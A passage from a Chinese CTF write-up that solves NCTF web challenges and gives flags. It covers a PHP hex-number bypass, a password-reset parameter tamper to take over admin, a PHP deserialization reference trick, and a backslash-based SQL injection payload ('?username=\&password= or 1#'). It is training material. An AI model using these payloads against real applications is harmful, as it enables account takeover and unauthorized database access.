</span></span><span style=display:flex><span>        $nine <span style=color:#f92672>=</span> <span style=color:#a6e22e>ord</span>(<span style=color:#e6db74>&#39;9&#39;</span>);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> ($i <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; $i <span style=color:#f92672>&lt;</span> <span style=color:#a6e22e>strlen</span>($number); $i<span style=color:#f92672>++</span>)
</span></span><span style=display:flex><span>        {   
</span></span><span style=display:flex><span>                $digit <span style=color:#f92672>=</span> <span style=color:#a6e22e>ord</span>($number{$i});
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>if</span> ( ($digit <span style=color:#f92672>&gt;=</span> $one) <span style=color:#f92672>&amp;&amp;</span> ($digit <span style=color:#f92672>&lt;=</span> $nine) )
</span></span><span style=display:flex><span>                {
</span></span><span style=display:flex><span>                        <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>false</span>;
</span></span><span style=display:flex><span>                }
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>           <span style=color:#66d9ef>return</span> $number <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;54975581388&#39;</span>;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>$flag<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;*******&#39;</span>;
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>noother_says_correct</span>($_GET[<span style=color:#e6db74>&#39;key&#39;</span>]))
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>echo</span> $flag;
</span></span><span style=display:flex><span><span style=color:#66d9ef>else</span> 
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#39;access denied&#39;</span>;
</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></span></span></code></pre></td></tr></table></div></div></blockquote><p>要求传入key不包含[1-9]，但又等于54975581388，考虑转十六进制，发现<code>54975581388=0xccccccccc</code>，</p><p>因此访问 <em><a href="http://chinalover.sinaapp.com/web12/index.php?key=0xccccccccc">http://chinalover.sinaapp.com/web12/index.php?key=0xccccccccc</a></em></p><h4 id=密码重置>密码重置<a hidden class=anchor aria-hidden=true href=#密码重置>#</a></h4><blockquote><p>重置管理员账号：admin 的密码</p><p>你在点击忘记密码之后 你的邮箱收到了这么一封重置密码的邮件：</p><p>点击<a href="http://nctf.nuptzj.cn/web13/index.php?user1=%59%33%52%6D%64%58%4E%6C%63%67%3D%3D">此链接</a>重置您的密码</p></blockquote><p><em>nctf{reset_password_often_have_vuln</em></p><p>修改重置链接的URL和POST中对应参数为admin相关的即可。</p><p>即向 <em><a href="http://nctf.nuptzj.cn/web13/index.php?user1=YWRtaW4%3D">http://nctf.nuptzj.cn/web13/index.php?user1=YWRtaW4%3D</a></em> post <em>user=admin&amp;newpass=aaaaa&amp;vcode=1234</em> 。</p><h4 id=php反序列化http11528150176php1indexphp><a href=http://115.28.150.176/php1/index.php>php反序列化</a><a hidden class=anchor aria-hidden=true href=#php反序列化http11528150176php1indexphp>#</a></h4><blockquote><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-23-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-23-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-23-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-23-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-23-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-23-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-23-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-23-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-23-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-23-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-23-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-23-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-23-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-23-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-23-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-23-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-23-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-23-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-23-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-23-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-23-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-23-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-23-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-23-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-23-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-23-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-23-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-23-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-23-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-23-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-23-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-23-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-23-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-23-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-23-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-23-18>18</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-23-19><a style=outline:none;text-decoration:none;color:inherit href=#hl-23-19>19</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-23-20><a style=outline:none;text-decoration:none;color:inherit href=#hl-23-20>20</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>just4fun</span> {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>var</span> $enter;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>var</span> $secret;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>isset</span>($_GET[<span style=color:#e6db74>&#39;pass&#39;</span>])) {
</span></span><span style=display:flex><span>    $pass <span style=color:#f92672>=</span> $_GET[<span style=color:#e6db74>&#39;pass&#39;</span>];
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>get_magic_quotes_gpc</span>()){
</span></span><span style=display:flex><span>        $pass<span style=color:#f92672>=</span><span style=color:#a6e22e>stripslashes</span>($pass);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    $o <span style=color:#f92672>=</span> <span style=color:#a6e22e>unserialize</span>($pass);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> ($o) {
</span></span><span style=display:flex><span>        $o<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>secret</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;*&#34;</span>;
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> ($o<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>secret</span> <span style=color:#f92672>===</span> $o<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>enter</span>)
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;Congratulation! Here is my secret: &#34;</span><span style=color:#f92672>.</span>$o<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>secret</span>;
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>else</span> 
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;Oh no... You can&#39;t fool me&#34;</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span> <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;are you trolling?&#34;</span>;
</span></span><span style=display:flex><span>}
</span></span></code></pre></td></tr></table></div></div></blockquote><p>链接失效，本地搭建环境实验。反序列化后的secret成员被赋予未知的值却要求另一成员enter其值与之相同，</p><p>从官方文档看到这么一句</p><p><code>Circular references inside the array/object you are serializing will also be stored</code>，</p><p>说明对象包含的引用在序列化时也会被存储，所以如果enter指向secret的引用，两个成员的值就可以同步变化了。</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-24-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-24-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-24-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-24-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-24-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-24-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-24-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-24-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-24-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-24-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-24-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-24-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-24-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-24-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-24-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-24-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-24-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-24-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-24-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-24-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-24-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-24-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-24-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-24-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-24-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-24-13>13</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>just4fun</span>{
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>var</span> $secret;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>var</span> $enter ;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>$f<span style=color:#f92672>=</span><span style=color:#66d9ef>new</span> <span style=color:#a6e22e>just4fun</span>();
</span></span><span style=display:flex><span>$f<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>enter</span><span style=color:#f92672>=&amp;</span>$f<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>secret</span>;
</span></span><span style=display:flex><span>$sf<span style=color:#f92672>=</span><span style=color:#a6e22e>serialize</span>($f);
</span></span><span style=display:flex><span><span style=color:#a6e22e>print_r</span>($sf);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$usf<span style=color:#f92672>=</span><span style=color:#a6e22e>unserialize</span>($sf);
</span></span><span style=display:flex><span><span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#39;&lt;br/&gt;&#39;</span>;
</span></span><span style=display:flex><span><span style=color:#a6e22e>print_r</span>($usf);
</span></span></code></pre></td></tr></table></div></div><p>输出如下</p><blockquote><p>O:8:&ldquo;just4fun&rdquo;:2:{s:6:&ldquo;secret&rdquo;;N;s:5:&ldquo;enter&rdquo;;R:2;}
just4fun Object ( [secret] => [enter] => )</p></blockquote><p>访问</p><p><code>http://127.0.0.1/nanyou.php?pass=O:8:%22just4fun%22:2:{s:6:%22secret%22;N;s:5:%22enter%22;R:2;}</code></p><p>验证成功。</p><p>别处看到flag为<code>nctf{serialize_and_unserialize}</code></p><h4 id=sql-injection4>sql injection4<a hidden class=anchor aria-hidden=true href=#sql-injection4>#</a></h4><blockquote><p>继续注入吧~
<a href=http://chinalover.sinaapp.com/web15/index.php>题目地址</a></p><p>TIP:反斜杠可以用来转义
仔细查看相关函数的用法</p></blockquote><p><em>nctf{sql_injection_is_interesting}</em></p><p>页面源代码注释中有SQL构造方式：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-25-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-25-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-25-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-25-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-25-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-25-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-25-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-25-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-25-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-25-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-25-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-25-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-25-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-25-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-25-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-25-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-25-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-25-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-25-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-25-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-25-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-25-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-25-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-25-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-25-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-25-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-25-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-25-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-25-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-25-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-25-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-25-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-25-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-25-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-25-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-25-18>18</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-25-19><a style=outline:none;text-decoration:none;color:inherit href=#hl-25-19>19</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-25-20><a style=outline:none;text-decoration:none;color:inherit href=#hl-25-20>20</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-25-21><a style=outline:none;text-decoration:none;color:inherit href=#hl-25-21>21</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#75715e>#GOAL: login as admin,then get the flag;
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#a6e22e>error_reporting</span>(<span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span><span style=color:#66d9ef>require</span> <span style=color:#e6db74>&#39;db.inc.php&#39;</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>clean</span>($str){
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>get_magic_quotes_gpc</span>()){
</span></span><span style=display:flex><span>		$str<span style=color:#f92672>=</span><span style=color:#a6e22e>stripslashes</span>($str);
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>return</span> <span style=color:#a6e22e>htmlentities</span>($str, <span style=color:#a6e22e>ENT_QUOTES</span>);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$username <span style=color:#f92672>=</span> <span style=color:#f92672>@</span><span style=color:#a6e22e>clean</span>((<span style=color:#a6e22e>string</span>)$_GET[<span style=color:#e6db74>&#39;username&#39;</span>]);
</span></span><span style=display:flex><span>$password <span style=color:#f92672>=</span> <span style=color:#f92672>@</span><span style=color:#a6e22e>clean</span>((<span style=color:#a6e22e>string</span>)$_GET[<span style=color:#e6db74>&#39;password&#39;</span>]);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$query<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;SELECT * FROM users WHERE name=\&#39;&#39;</span><span style=color:#f92672>.</span>$username<span style=color:#f92672>.</span><span style=color:#e6db74>&#39;\&#39; AND pass=\&#39;&#39;</span><span style=color:#f92672>.</span>$password<span style=color:#f92672>.</span><span style=color:#e6db74>&#39;\&#39;;&#39;</span>;
</span></span><span style=display:flex><span>$result<span style=color:#f92672>=</span><span style=color:#a6e22e>mysql_query</span>($query);
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span>(<span style=color:#f92672>!</span>$result <span style=color:#f92672>||</span> <span style=color:#a6e22e>mysql_num_rows</span>($result) <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>1</span>){
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#39;Invalid password!&#39;</span>);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>echo</span> $flag;
</span></span></code></pre></td></tr></table></div></div><p>核心函数是<code>htmlentities($str, ENT_QUOTES)</code> ，函数原型是这样</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-26-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-26-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#a6e22e>string</span> <span style=color:#a6e22e>htmlentities</span> ( <span style=color:#a6e22e>string</span> $string [, <span style=color:#a6e22e>int</span> $flags <span style=color:#f92672>=</span> <span style=color:#a6e22e>ENT_COMPAT</span> <span style=color:#f92672>|</span> <span style=color:#a6e22e>ENT_HTML401</span> [, <span style=color:#a6e22e>string</span> $encoding <span style=color:#f92672>=</span> <span style=color:#a6e22e>ini_get</span>(<span style=color:#e6db74>&#34;default_charset&#34;</span>) [, <span style=color:#a6e22e>bool</span> $double_encode <span style=color:#f92672>=</span> <span style=color:#66d9ef>true</span> ]]] )
</span></span></code></pre></td></tr></table></div></div><p>参数flags缺省情况下与<code>$flags=ENT_QUOTES</code>情况下函数行为不同，</p><p>选值为<code>ENT_QUOTES</code>时<code> Will convert both double and single quotes</code>，</p><p>也就是说，前者不会将单引号编码而后者会。我们的最终目标是平衡引号，从而使查询语句语法正确，既然无法输入单引号，就消灭单引号。</p><p>访问<code>http://chinalover.sinaapp.com/web15/index.php?username=\&amp;password=%20or%201%23</code>，</p><p>也就是构造payload为<code>?username=\&amp;password=%20or%201%23</code> ，使得查询语句如下：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-27-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-27-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-27-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-27-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-27-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-27-3>3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-27-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-27-4>4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-27-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-27-5>5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-27-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-27-6>6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-27-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-27-7>7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-27-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-27-8>8</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#66d9ef>SELECT</span> <span style=color:#f92672>*</span> <span style=color:#66d9ef>FROM</span> users <span style=color:#66d9ef>WHERE</span> name<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;\&#39;</span> <span style=color:#66d9ef>AND</span> pass<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;%20or%201%23&#39;</span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>即</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>SELECT</span> <span style=color:#f92672>*</span> <span style=color:#66d9ef>FROM</span> users <span style=color:#66d9ef>WHERE</span> 
</span></span><span style=display:flex><span>name<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;\&#39;</span> <span style=color:#66d9ef>AND</span> pass<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;  				『 [name]的值为 [&#39;</span> <span style=color:#66d9ef>AND</span> pass<span style=color:#f92672>=</span>]  <span style=color:#960050;background-color:#1e0010>，显然逻辑值为</span><span style=color:#66d9ef>false</span> <span style=color:#960050;background-color:#1e0010>』</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>or</span> <span style=color:#ae81ff>1</span>                 				<span style=color:#960050;background-color:#1e0010>『</span> <span style=color:#960050;background-color:#1e0010>但没关系，</span>[<span style=color:#66d9ef>false</span> <span style=color:#66d9ef>or</span> <span style=color:#ae81ff>1</span>] <span style=color:#960050;background-color:#1e0010>的逻辑值为真』</span> 
</span></span><span style=display:flex><span><span style=color:#f92672>#</span><span style=color:#e6db74>&#39;                   				『 注释掉多余的单引号 』
</span></span></span><span style=display:flex><span><span style=color:#e6db74>即
</span></span></span><span style=display:flex><span><span style=color:#e6db74>select * from users where false or 1
</span></span></span></code></pre></td></tr></table></div></div><p>附：</p><p>​ 具体编码方式可使用</p><p><code>print_r(get_html_translation_table($table =HTML_ENTITIES,$flags=ENT_QUOTES))</code>查看，</p><p>| <code>ENT_COMPAT | ENT_HTML401</code> | <code>ENT_QUOTES</code> |
| :&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;: | :&mdash;&mdash;&mdash;&mdash;-: |
| <code>[&] => &amp;amp;</code> | <code>[&] => &amp;amp;</code> |
| <code>["] => &amp;quot;</code> | <code>["] => &amp;quot;</code> |
